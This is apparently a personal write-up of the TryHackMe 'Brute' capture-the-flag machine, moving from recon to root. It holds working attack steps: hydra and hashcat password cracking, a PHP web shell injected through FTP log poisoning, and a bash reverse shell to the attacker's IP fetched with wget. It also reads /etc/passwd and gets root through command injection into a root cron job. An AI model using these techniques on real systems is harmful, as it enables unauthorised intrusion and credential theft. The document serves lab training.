# Enumeration
## ping scan
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ ping 10.10.89.175
PING 10.10.89.175 (10.10.89.175) 56(84) bytes of data.
64 bytes from 10.10.89.175: icmp_seq=1 ttl=63 time=55.2 ms
64 bytes from 10.10.89.175: icmp_seq=2 ttl=63 time=90.4 ms
^C
--- 10.10.89.175 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 55.168/72.781/90.394/17.613 ms
```
## nmap scan
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ sudo nmap -sC -sV -oN nmap_results.txt 10.10.89.175
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-04 16:39 EET
Nmap scan report for 10.10.89.175
Host is up (0.058s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c7721464243c1101e950730fa48c33d6 (RSA)
|   256 0e0e07a53c3209ed921b6884f12fcce1 (ECDSA)
|_  256 32f1d2ececc1ba2218ec02f4bc74c7af (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
3306/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.28-0ubuntu0.20.04.3
|   Thread ID: 11
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, FoundRows, ODBCClient, Speaks41ProtocolOld, InteractiveClient, IgnoreSigpipes, SwitchToSSLAfterHandshake, ConnectWithDatabase, SupportsTransactions, SupportsCompression, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, LongPassword, Speaks41ProtocolNew, SupportsLoadDataLocal, LongColumnFlag, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: !ifs|wfpEu@\x1A8B\x15u+
| V/
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
| Not valid before: 2021-10-19T04:00:09
|_Not valid after:  2031-10-17T04:00:09
|_ssl-date: TLS randomness does not represent time
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.60 seconds
```
Notes: 
- port 21 for ftp is open
- port 22 for ssh is open
- port 80 for http is open
- port 3306 for mysql is open
## http enum
![[Pasted image 20221104164321.png]]
Notes:
- possible password brute-force attack
- request method: POST
## ftp enum
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ sudo nmap 10.10.89.175 --script ftp-anon -p 21 -oN nmap_ftp_script_results.txt 
[sudo] password for sami: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-04 17:13 EET
Nmap scan report for 10.10.89.175
Host is up (0.052s latency).

PORT   STATE SERVICE
21/tcp open  ftp

Nmap done: 1 IP address (1 host up) scanned in 4.15 seconds
```
Notes: 
- login requires credentials; which are not obtained.
## http dir enum
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ gobuster dir -u http://10.10.89.175 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -q -o gobuster_results.txt -x txt,php,html,js -t 20
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 1080]
/.html                (Status: 403) [Size: 277]
/welcome.php          (Status: 302) [Size: 0] [--> login.php]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/config.php           (Status: 200) [Size: 0]
```
Notes: 
- Nothing interesting except `index.php`
## mysql enum
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ sudo nmap -p 3306 --script=mysql-enum,mysql-databases 10.10.89.175 -oN nmap_qsl_script_results.txt  
[sudo] password for sami: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-04 17:21 EET
Nmap scan report for 10.10.89.175
Host is up (0.053s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0

Nmap done: 1 IP address (1 host up) scanned in 0.73 seconds
```
Notes: 
- username wordlist
```
root
netadmin
guest
user
web
sysadmin
administrator
webadmin
admin
test
```

# Weaponization
## wordlists
```txt
username wordlist:
usernames.txt
rockyou.txt
```
# Exploitation
## hydra 
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ hydra -L usernames.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -t 4 mysql://10.10.89.175 -V -f
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-04 17:41:00
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 143443980 login tries (l:10/p:14344398), ~35860995 tries per task
[DATA] attacking mysql://10.10.89.175:3306/
...
[ATTEMPT] target 10.10.89.175 - login "root" - pass "rockyou" - 8 of 143443980 
...
[3306][mysql] host: 10.10.89.175   login: root   password: #####
[STATUS] attack finished for 10.10.89.175 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-04 17:41:12
```
Notes: username: root password: #####
# Post-Exploit Enum
## ftp
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ ftp root@10.10.89.175
Connected to 10.10.89.175.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
ftp> bye
221 Goodbye.
```
Notes: unable to login with root:rockyou
## mysql
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ mysql -h 10.10.89.175 -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 17598
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| website            |
+--------------------+
5 rows in set (0.055 sec)

MySQL [(none)]> use website;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [website]> show tables;
+-------------------+
| Tables_in_website |
+-------------------+
| users             |
+-------------------+
1 row in set (0.055 sec)

MySQL [website]> show * from users;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '* from users' at line 1
MySQL [website]> select * from users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | Adrian   | $2y$10$tLzQuuQ.h#######3EF9gQO4aJ8KdnSYxz0SKn4we | 2021-10-20 02:43:42 |
+----+----------+--------------------------------------------------------------+---------------------+
1 row in set (0.056 sec)

MySQL [website]> 
```
Notes: 
- Username: Adrian
- Password hash: `$2y$10$tLzQuuQ.h######9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we`
## hashid
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ hashid '$2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we'
Analyzing '$2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
```
Notes:
- hashcat mode number 3200
## hashcat
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ hashcat -a 0 -m 3200 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -o hashcat_results.txt
hashcat (v6.2.6) starting

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
* Device #2: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
CUDA API (CUDA 11.6)
====================
* Device #1: NVIDIA GeForce GTX 1060 6GB, 5665/6075 MB, 10MCU

OpenCL API (OpenCL 3.0 CUDA 11.6.134) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #2: NVIDIA GeForce GTX 1060 6GB, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 32 MB

Dictionary cache building /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt: 33553435Dictionary cache building /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt: 10066030Dictionary cache built:
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSY...SKn4we
Time.Started.....: Fri Nov  4 18:09:18 2022 (3 secs)
Time.Estimated...: Fri Nov  4 18:09:21 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      341 H/s (10.62ms) @ Accel:8 Loops:4 Thr:12 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 960/14344384 (0.01%)
Rejected.........: 0/960 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1020-1024
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> sandy
Hardware.Mon.#1..: Temp: 46c Fan:  0% Util: 98% Core:1999MHz Mem:3898MHz Bus:2

Started: Fri Nov  4 18:09:12 2022
Stopped: Fri Nov  4 18:09:23 2022
```
Notes: 
- result: tigger
- username: Adrian 
- passoword: tigger
## ftp login
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ ftp adrian@10.10.89.175 
Connected to 10.10.89.175.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```
## ssh login
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ ssh adrian@10.10.89.175
adrian@10.10.89.175's password: 
Permission denied, please try again.
adrian@10.10.89.175's password: 
```
## http form login
![[Pasted image 20221104181534.png]]
Notes: the log button shows the logs from either the ftp server of ssh
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Welcome</title>
    <link rel="stylesheet" href="[https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css](view-source:https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css)">
    <style>
        body{ font: 14px sans-serif; text-align: center; }
    </style>
</head>
<body>
    <h1 class="my-5">Welcome back Adrian, Your log file is ready for viewing.</h1>
    Fri Nov  4 14:39:56 2022 [pid 1059] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 14:40:02 2022 [pid 1101] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 14:40:02 2022 [pid 1100] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 14:40:02 2022 [pid 1102] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 14:40:03 2022 [pid 1104] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 14:40:05 2022 [pid 1094] [anonymous] FAIL LOGIN: Client "::ffff:10.11.4.14"
Fri Nov  4 14:40:05 2022 [pid 1095] [anonymous] FAIL LOGIN: Client "::ffff:10.11.4.14"
Fri Nov  4 14:40:05 2022 [pid 1093] [anonymous] FAIL LOGIN: Client "::ffff:10.11.4.14"
Fri Nov  4 14:40:08 2022 [pid 1120] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 14:40:08 2022 [pid 1122] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 14:40:08 2022 [pid 1124] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 14:44:45 2022 [pid 1262] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 15:13:23 2022 [pid 2581] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 15:13:26 2022 [pid 2580] [anonymous] FAIL LOGIN: Client "::ffff:10.11.4.14"
Fri Nov  4 15:14:51 2022 [pid 2634] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 15:14:55 2022 [pid 2640] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 15:14:55 2022 [pid 2642] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 15:14:55 2022 [pid 2641] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 15:14:55 2022 [pid 2643] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 15:14:57 2022 [pid 2636] [anonymous] FAIL LOGIN: Client "::ffff:10.11.4.14"
Fri Nov  4 15:14:57 2022 [pid 2639] [anonymous] FAIL LOGIN: Client "::ffff:10.11.4.14"
Fri Nov  4 15:14:57 2022 [pid 2638] [anonymous] FAIL LOGIN: Client "::ffff:10.11.4.14"
Fri Nov  4 15:14:58 2022 [pid 2646] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 15:14:58 2022 [pid 2648] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 15:14:59 2022 [pid 2650] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 15:48:03 2022 [pid 5012] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 15:48:09 2022 [pid 5011] [root] FAIL LOGIN: Client "::ffff:10.11.4.14"
Fri Nov  4 15:48:23 2022 [pid 5016] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 15:48:31 2022 [pid 5015] [root] FAIL LOGIN: Client "::ffff:10.11.4.14"
Fri Nov  4 16:11:29 2022 [pid 7315] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 16:11:36 2022 [pid 7314] [adrian] FAIL LOGIN: Client "::ffff:10.11.4.14"
Fri Nov  4 16:12:50 2022 [pid 7457] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 16:12:55 2022 [pid 7456] [adrian] FAIL LOGIN: Client "::ffff:10.11.4.14"
Fri Nov  4 16:14:31 2022 [pid 7680] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 16:14:35 2022 [pid 7679] [adrian] FAIL LOGIN: Client "::ffff:10.11.4.14"
<br>    <br> 
    <form action="[](view-source:http://10.10.89.175/welcome.php)" method="post">
        <input type="submit" name="log" value="Log">	
    </form>
    <br>
    <p> 
        <a href="[logout.php](view-source:http://10.10.89.175/logout.php)" class="btn btn-danger ml-3">Sign Out of Your Account</a>
    </p>
</body>
</html>
```
Notes: ftp and ssh logins should be retested again
### first step: ssh login
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ date && ssh adrian@10.10.89.175
Fri Nov  4 06:24:30 PM EET 2022
adrian@10.10.89.175's password: 
Permission denied, please try again.
adrian@10.10.89.175's password: 
```
### second step: ftp login
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ date && ftp adrian@10.10.89.175 
Fri Nov  4 06:25:03 PM EET 2022
Connected to 10.10.89.175.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> bye
221 Goodbye.
```
### third step: logs check
```html
Fri Nov  4 16:25:07 2022 [pid 8948] [adrian] FAIL LOGIN: Client "::ffff:10.11.4.14"
```
Notes: ftp login logs
# Testing
## log poisoning php code
```php 
'<?php system($_GET['cmd']); ?>'
```
## ftp login 
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ date && ftp 10.10.89.175  
Fri Nov  4 06:35:26 PM EET 2022
Connected to 10.10.89.175.
220 (vsFTPd 3.0.3)
Name (10.10.89.175:sami): '<?php system($_GET['cmd']); ?>'
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> bye
221 Goodbye.
```
## url with id
```url
http://10.10.89.175/welcome.php?cmd=id
```
## log check
```html
Fri Nov  4 16:35:38 2022 [pid 10204] [''] FAIL LOGIN: Client "::ffff:10.11.4.14"
Fri Nov  4 16:38:06 2022 [pid 10600] CONNECT: Client "::ffff:10.11.4.14"
Fri Nov  4 16:38:14 2022 [pid 10599] ['uid=33(www-data) gid=33(www-data) groups=33(www-data)
'] FAIL LOGIN: Client "::ffff:10.11.4.14"
```
Notes: log poisoning works
# Weaponization
## script to be uploaded
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ cat file.sh         
bash -i >& /dev/tcp/10.11.4.14/1234 0>&1
```
Notes: 
- bash reverse shell script
# Delivery
## hosting the file
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ python3 -m http.server 8001
```
Notes: python webserver
## requesting the file from the victim machine
```url
http://10.10.14.19/welcome.php?cmd=wget+http://10.11.4.14:8001/file.sh
```
Notes: file has been uploaded successfully
## giving executable permissions to the file
```sh
chmod+777+file.sh
```
Notes: process went successfully
# Exploitation
## executing the file
```sh
bash+file.sh
```
Notes: reverse shell was received

```sh
sami@bt:~/Documents/THM/CTFs/Brute$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.11.4.14] from (UNKNOWN) [10.10.14.19] 54858
bash: cannot set terminal process group (795): Inappropriate ioctl for device
bash: no job control in this shell
www-data@brute:/var/www/html$ 
```
# Post-Exploit Enum
```sh
www-data@brute:/tmp$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
adrian:x:1000:1000:adrian:/home/adrian:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:114:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
www-data@brute:/tmp$ su adrian
su adrian
Password: ####
su: Authentication failure
www-data@brute:/tmp$ wget http://10.11.4.14:8001/linpeas.sh
wget http://10.11.4.14:8001/linpeas.sh
--2022-11-04 17:55:28--  http://10.11.4.14:8001/linpeas.sh
Connecting to 10.11.4.14:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 827827 (808K) [text/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... ..........  6%  347K 2s
    50K .......... .......... .......... .......... .......... 12%  697K 2s
   100K .......... .......... .......... .......... .......... 18%  700K 1s
   150K .......... .......... .......... .......... .......... 24%  706K 1s
   200K .......... .......... .......... .......... .......... 30% 9.34M 1s
   250K .......... .......... .......... .......... .......... 37% 2.56M 1s
   300K .......... .......... .......... .......... .......... 43%  411K 1s
   350K .......... .......... .......... .......... .......... 49%  219M 1s
   400K .......... .......... .......... .......... .......... 55% 6.32M 0s
   450K .......... .......... .......... .......... .......... 61% 36.3M 0s
   500K .......... .......... .......... .......... .......... 68% 2.65M 0s
   550K .......... .......... .......... .......... .......... 74%  257M 0s
   600K .......... .......... .......... .......... .......... 80% 1.17M 0s
   650K .......... .......... .......... .......... .......... 86% 9.85M 0s
   700K .......... .......... .......... .......... .......... 92%  573K 0s
   750K .......... .......... .......... .......... .......... 98% 26.5M 0s
   800K ........                                              100%  243M=0.7s

2022-11-04 17:55:28 (1.18 MB/s) - 'linpeas.sh' saved [827827/827827]

www-data@brute:/tmp$ chmod +x linpeas.sh && ./linpeas.sh
```
Notes:
- Vulnerable to CVE-2021-3560
- Potentially Vulnerable to CVE-2022-2588
- [CVE-2021-4034] PwnKit
- /usr/share/openssh/sshd_config
- ╔══════════╣ Searching passwords in config PHP files
define('DB_PASSWORD', '#######');
define('DB_USERNAME', 'adrian');
```sh
www-data@brute:/home/adrian$ ls -hla
ls -hla
total 48K
drwxr-xr-x 4 adrian adrian  4.0K Apr  5  2022 .
drwxr-xr-x 3 root   root    4.0K Oct 19  2021 ..
lrwxrwxrwx 1 adrian adrian     9 Oct 20  2021 .bash_history -> /dev/null
-rw-r--r-- 1 adrian adrian   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 adrian adrian  3.7K Feb 25  2020 .bashrc
drwx------ 2 adrian adrian  4.0K Oct 19  2021 .cache
-rw-r--r-- 1 adrian adrian   807 Feb 25  2020 .profile
-rw-r--r-- 1 adrian adrian    43 Oct 20  2021 .reminder
-rw-rw-r-- 1 adrian adrian    75 Apr  5  2022 .selected_editor
-rw-r--r-- 1 adrian adrian     0 Oct 19  2021 .sudo_as_admin_successful
-rw------- 1 adrian adrian     0 Apr  6  2022 .viminfo
drwxr-xr-x 3 nobody nogroup 4.0K Oct 20  2021 ftp
-rw-r----- 1 adrian adrian  1.5K Nov  4 18:08 punch_in
-rw-r----- 1 root   adrian    94 Apr  5  2022 punch_in.sh
-rw-r----- 1 adrian adrian    21 Apr  5  2022 user.txt
www-data@brute:/home/adrian$ cat .reminder 
cat .reminder
Rules:
best of 64
+ exclamation

ettubrute
www-data@brute:/home/adrian$ 
```
Notes: at this point, I didn't know what to do next, therefore I've taken notes from [https://ishsome.medium.com/tryhackme-brute-walk-through-82df511a00e3]
- best of 64 can be related to johntheripper where we can specify this rule to create a wordlist using a single word.
- So, to break down the **_.reminder_** file, the word ‘**_ettubrute_**’ should be used to create a word list of passwords using best64 rule.
- To each word generated in the file, we need to add “!” at the end.
- We may then use hydra to brute force SSH to find out if any of the generated words matches with adrian for SSH login
# Offline password forging 
## making a "wordlist" with "ettubrute" only
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ echo -n "ettubrute" > word.txt
sami@bt:~/Documents/THM/CTFs/Brute$ cat word.txt                  
ettubrute
```
## john
```sh
john -wordlist:word.txt -rules:best64 -stdout > passwords
```
## append '!' at the end of each line
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ cat passwords
ettubrute!
eturbutte!
ETTUBRUTE!
Ettubrute!
ettubrute0!
ettubrute1!
ettubrute2!
ettubrute3!
ettubrute4!
ettubrute5!
ettubrute6!
ettubrute7!
ettubrute8!
ettubrute9!
ettubrute00!
ettubrute01!
ettubrute02!
ettubrute11!
ettubrute12!
ettubrute13!
ettubrute21!
ettubrute22!
ettubrute23!
ettubrute69!
ettubrute77!
ettubrute88!
ettubrute99!
ettubrute123!
ettubrutee!
ettubrutes!
ettubruta!
ettubrus!
ettubrua!
ettubruer!
ettubruie!
ettubro!
ettubry!
ettubr123!
ettubrman!
ettubrdog!
1ettubrute!
theettubrute!
dttubrute!
matubrute!
3ttubrut3!
etubrute!
etbrute!
ettbrute!
etturute!
ettb!
ettub1!
ettubrut!
ettubru!
ettubr!
ettubrettubr!
etubr!
bsut!
etubrut!
ettubre!
sttubru!
uteettubr!
rute!
brute!
ubruubru!
cttu!
ubeube!
mttubrute!
hubrute!
ettuut!
ettbettb!
ube!
etttettt!
etut!
ettubu!
erutee!
```
Notes: double-checked
# SSH login brute-force
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ hydra -t 4 -V -f -l adrian -P passwords ssh://10.10.14.19
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-04 20:39:52
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 75 login tries (l:1/p:75), ~19 tries per task
[DATA] attacking ssh://10.10.14.19:22/
[ATTEMPT] target 10.10.14.19 - login "adrian" - pass "#######" - 1 of 75 [child 0] (0/0)
...
[22][ssh] host: 10.10.14.19   login: adrian   password: ########
[STATUS] attack finished for 10.10.14.19 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-04 20:41:02
```
Notes:
- ssh login creds: username: adrian password: #####
# SSH login
```sh
Last login: Tue Apr  5 23:46:50 2022 from 10.0.2.26
adrian@brute:~$ whoami
adrian
adrian@brute:~$ 
```
Notes: finally
# Privileges Escalation
```sh
adrian@brute:~$ sudo -l
[sudo] password for adrian: 
Sorry, user adrian may not run sudo on brute.
adrian@brute:~/ftp/files$ cat script 
#!/bin/sh
while read line;
do
  /usr/bin/sh -c "echo $line";
done < /home/adrian/punch_in
adrian@brute:~/ftp/files$ ls -hla
total 16K
drwxr-xr-x 2 adrian adrian  4.0K Oct 23  2021 .
drwxr-xr-x 3 nobody nogroup 4.0K Oct 20  2021 ..
-rw-r----- 1 adrian adrian   203 Oct 20  2021 .notes
-rw-r----- 1 adrian adrian    90 Oct 21  2021 script
adrian@brute:~/ftp/files$ nano script
adrian@brute:~/ftp/files$ cat .notes 
That silly admin
He is such a micro manager, wants me to check in every minute by writing
on my punch card.

He even asked me to write the script for him.

Little does he know, I am planning my revenge.

```
Notes:
- the script is echoing each line from /home/adrian/punch_in as adrian
- the punch_in.sh script is ran by a root crontab in /var/spool/cron/crontabs
```sh
adrian@brute:~$ ls /var/spool/cron/crontabs/
ls: cannot open directory '/var/spool/cron/crontabs/': Permission denied
```
- testing how to get out from echo's (''):
```sh
sami@bt:~/Documents/THM/CTFs/Brute$ echo `whoami`  
sami
```
## adding to the punch_in file
```sh
`chmod +s /bin/bash`
```
Notes: waiting 1 min for the root cronjob to execute 
```sh
adrian@brute:~$ ls -hla /bin/bash
-rwsr-sr-x 1 root root 1.2M Jun 18  2020 /bin/bash
adrian@brute:~$ /bin/bash -p
bash-5.0# whoami
root
```
# Investigating the cronjobs
```c
bash-5.0# cd  /var/spool/cron/crontabs
bash-5.0# ls -hla
total 16K
drwx-wx--T 2 root   crontab 4.0K Nov  4 18:50 .
drwxr-xr-x 5 root   root    4.0K Aug 24  2021 ..
-rw------- 1 adrian crontab 1.2K Apr  5  2022 adrian
-rw------- 1 root   crontab 1.5K Apr  5  2022 root
bash-5.0# cat adrian 
*/1 * * * * /usr/bin/bash /home/adrian/punch_in.sh  // runs punch_in.sh every min as root
bash-5.0# cat root 
*/1 * * * * /usr/bin/bash /root/check_in.sh  // runs check_in.sh every min as root
bash-5.0# cat /root/check_in.sh  // here is the real deal with out priv-esc
#!/bin/sh
while read line;
do
  /usr/bin/sh -c "echo $line";
done < /home/adrian/punch_in 
bash-5.0# 
```
# Done